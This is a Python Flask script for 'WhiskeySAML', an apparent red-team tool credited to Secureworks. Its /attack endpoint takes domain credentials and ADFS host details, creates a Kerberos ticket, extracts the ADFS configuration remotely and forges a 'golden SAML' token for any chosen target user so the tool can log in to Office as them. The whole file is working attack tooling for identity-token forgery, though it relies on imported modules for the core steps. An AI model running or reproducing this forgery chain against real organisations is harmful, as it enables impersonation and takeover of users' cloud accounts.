#!/usr/bin/python3

# Copyright 2021 Secureworks
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import logging
import argparse
import base64
from flask import Flask, request, render_template  # type: ignore
from ticketsplease.modules.dcsync import DCSYNC
from ticketsplease.modules.ticket import create_ticket  # type: ignore
from ticketsplease.modules.adfs import get_configuration  # type: ignore
from ticketsplease.modules.saml import generate_golden_saml  # type: ignore

__version__ = "0.1.0"

app = Flask(__name__)


@app.route("/attack", methods=["POST"])
def attack():
    # Get User's Options from the request form
    target_user = request.form.get("target_user", None)
    domain = request.form.get("domain", None)
    adfs_host = request.form.get("adfs_host", None)
    dc_ip = request.form.get("dc_ip", None)
    domain_username = request.form.get("domain_username", None)
    domain_password = request.form.get("domain_password", None)
    service_account = request.form.get("service_account", None)

    # Next, create a Kerberos ticket
    # We are generating a Kerberos ticket for the domain
    # user to authenticate and pull down the ADFS config
    # settings. Since we have the domain username and
    # password, we pass them as the target user values
    # and the ticket module will use LDAP to query for
    # the SID to create the ticket.
    (krb_ticket, cipher, sessionKey) = create_ticket(
        domain=domain,
        host=adfs_host,
        user=service_account,
        domain_username=domain_username,
        domain_password=domain_password,
        dc_ip=dc_ip,
        ap_req=True,
    )

    # Next, use the Kerberos ticket to authenticate and extract the ADFS
    # config remotely
    configuration = get_configuration(
        adfs_host=adfs_host,
        ticket=krb_ticket,
        sessionKey=sessionKey,
        cipher=None,
    )

    # Finally, use the ADFS config to generate the SAML token
    token = generate_golden_saml(
        adfs_config=configuration,
        domain=domain,
        target_user=target_user,
        domain_username=domain_username,
        domain_password=domain_password,
        dc_ip=dc_ip,
    )

    # Send the Golden SAML to be prepped for submitting to Office
    # The full SAML token is sent, not just the Assertion like when
    # requesting an Azure Access Token
    return render_template("login.html", token=token)


@app.route("/")
def index():
    return render_template("index.html")


if __name__ == "__main__":

    parser = argparse.ArgumentParser(description=f"WhiskeySAML -- v{__version__}")
    parser.add_argument(
        "--port",
        type=int,
        default=8443,
        help="Port to run the HTTPS server on. Default: 8443",
    )
    parser.add_argument(
        "--debug",
        action="store_true",
        help="Enable server debugging.",
    )
    args = parser.parse_args()

    # Initialize logging level and format
    if args.debug:
        logging_level = logging.DEBUG
        logging_format = (
            "[%(asctime)s] %(levelname)-5s - %(filename)17s:%(lineno)-4s - %(message)s"
        )
    else:
        logging_level = logging.INFO
        logging_format = "[%(asctime)s] %(levelname)-5s: %(message)s"

    logging.basicConfig(format=logging_format, level=logging_level)
    logging.addLevelName(logging.WARNING, "WARN")

    app.run("0.0.0.0", ssl_context="adhoc", port=args.port)
